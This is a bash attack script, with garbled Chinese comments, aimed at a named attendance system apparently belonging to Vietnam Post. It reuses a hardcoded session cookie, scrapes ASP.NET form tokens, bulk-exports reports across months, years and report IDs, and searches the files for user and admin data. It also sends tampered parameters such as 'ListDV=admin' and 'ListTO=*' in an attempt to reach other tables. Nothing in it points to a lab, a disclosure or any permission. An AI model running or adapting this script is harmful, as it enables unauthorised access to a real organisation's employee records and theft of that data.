#!/bin/bash

COOKIE="ASP.NET_SessionId=omtonrrfveu055ojf1dnmgwx"
BASE="http://vps.vnpost.vn/chamcong"

echo "ðŸ”¥ åˆ©ç”¨ExportåŠŸèƒ½æ·±åº¦æŒ–æŽ˜"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

# èŽ·å–ViewState
page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" -H "Cookie: $COOKIE")
VIEWSTATE=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VIEWGEN=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EVENTVAL=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

echo "[1] æµ‹è¯•ä¸åŒæœˆä»½å¯¼å‡ºï¼ˆèŽ·å–åŽ†å²æ•°æ®ï¼‰..."
for month in {1..12}; do
    echo -n "  å¯¼å‡º ${month}æœˆ/2025: "
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VIEWGEN" \
        --data-urlencode "__EVENTVALIDATION=$EVENTVAL" \
        --data-urlencode "txtThang=$month" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "export_2025_${month}.xls" 2>&1
    
    size=$(wc -c < "export_2025_${month}.xls")
    if [ $size -gt 5000 ]; then
        echo "âœ… $size bytes (æœ‰æ•°æ®!)"
        # æ£€æŸ¥æ˜¯å¦åŒ…å«ç”¨æˆ·ä¿¡æ¯
        if strings "export_2025_${month}.xls" | grep -qi "KVMB\|admin\|user"; then
            echo "    ðŸ”¥ åŒ…å«ç”¨æˆ·ä¿¡æ¯!"
        fi
    else
        echo "- $size bytes"
    fi
done

echo -e "\n[2] æµ‹è¯•ä¸åŒå¹´ä»½..."
for year in 2024 2023 2022 2021 2020; do
    echo -n "  å¯¼å‡º 11æœˆ/${year}: "
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VIEWGEN" \
        --data-urlencode "__EVENTVALIDATION=$EVENTVAL" \
        --data-urlencode "txtThang=11" \
        --data-urlencode "txtNam=$year" \
        --data-urlencode "btnExport=Export" \
        -o "export_${year}_11.xls" 2>&1
    
    size=$(wc -c < "export_${year}_11.xls")
    echo "$size bytes"
done

echo -e "\n[3] å°è¯•ä¸åŒIDå¯¼å‡ºï¼ˆå¯èƒ½å¯¼å‡ºä¸åŒéƒ¨é—¨/ç”¨æˆ·æ•°æ®ï¼‰..."
for id in MAU1 MAU3 MAU4 MAU5 BCC1 BCC2; do
    echo -n "  å¯¼å‡º ID=$id: "
    
    # é‡æ–°èŽ·å–ViewStateï¼ˆé’ˆå¯¹æ–°IDï¼‰
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" -H "Cookie: $COOKIE")
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=11" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "export_ID_${id}.xls" 2>&1
    
    size=$(wc -c < "export_ID_${id}.xls")
    echo "$size bytes"
done

echo -e "\n[4] æµ‹è¯•å‚æ•°æ³¨å…¥ï¼ˆå°è¯•å¯¼å‡ºå…¶ä»–è¡¨ï¼‰..."
# å°è¯•ä¿®æ”¹éšè—å‚æ•°
INJECTIONS=(
    "ListDV=1"
    "ListDV=admin"
    "ListBP=all"
    "ListTO=*"
)

for inj in "${INJECTIONS[@]}"; do
    echo -n "  æ³¨å…¥: $inj: "
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VIEWGEN" \
        --data-urlencode "__EVENTVALIDATION=$EVENTVAL" \
        --data-urlencode "txtThang=11" \
        --data-urlencode "txtNam=2025" \
        --data "$inj" \
        --data-urlencode "btnExport=Export" \
        -o "export_inject_$(echo $inj | md5sum | cut -d' ' -f1).xls" 2>&1
    
    size=$(wc -c < "export_inject_$(echo $inj | md5sum | cut -d' ' -f1).xls")
    if [ $size -ne 8271 ]; then
        echo "âœ… å¼‚å¸¸: $size bytes"
    else
        echo "- $size bytes"
    fi
done

echo -e "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ðŸ“Š æ‰€æœ‰å¯¼å‡ºæ–‡ä»¶:"
ls -lh export_*.xls 2>/dev/null | head -20

echo -e "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ðŸ” æå–æœ€å¤§æ–‡ä»¶çš„å†…å®¹..."
largest=$(ls -S export_*.xls 2>/dev/null | head -1)
if [ -n "$largest" ]; then
    echo "æœ€å¤§æ–‡ä»¶: $largest ($(wc -c < $largest) bytes)"
    echo ""
    echo "æ–‡æœ¬å†…å®¹ï¼ˆå‰500è¡Œï¼‰:"
    strings "$largest" | head -500 | tee largest_export_content.txt
fi
